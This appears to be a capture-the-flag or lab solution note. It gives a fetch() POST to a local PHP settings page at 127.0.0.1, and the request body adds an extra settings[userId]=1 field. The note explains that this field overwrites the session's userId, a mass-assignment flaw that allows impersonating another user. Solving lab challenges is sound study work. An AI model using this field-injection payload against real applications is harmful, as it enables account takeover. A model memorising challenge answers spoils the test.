# Example solving request:

```js
fetch("http://127.0.0.1:8080/settings.php", {
  "headers": {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "accept-language": "en-US,en;q=0.9,fr;q=0.8",
    "cache-control": "max-age=0",
    "content-type": "application/x-www-form-urlencoded",
    "sec-ch-ua": "\"Google Chrome\";v=\"143\", \"Chromium\";v=\"143\", \"Not A(Brand\";v=\"24\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Linux\"",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    "sec-fetch-user": "?1",
    "upgrade-insecure-requests": "1"
  },
  "referrer": "http://127.0.0.1:5173/settings.php",
  "body": "settings%5Btheme%5D=light&settings%5Bfont_size%5D=small&settings%5BuserId%5D=1",
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});
```

# Explaination:

```
settings[theme]=light&settings[font_size]=small&settings[userId]=1
```

> `&settings[userId]=1` will overwrite $_SESSION["userId"]
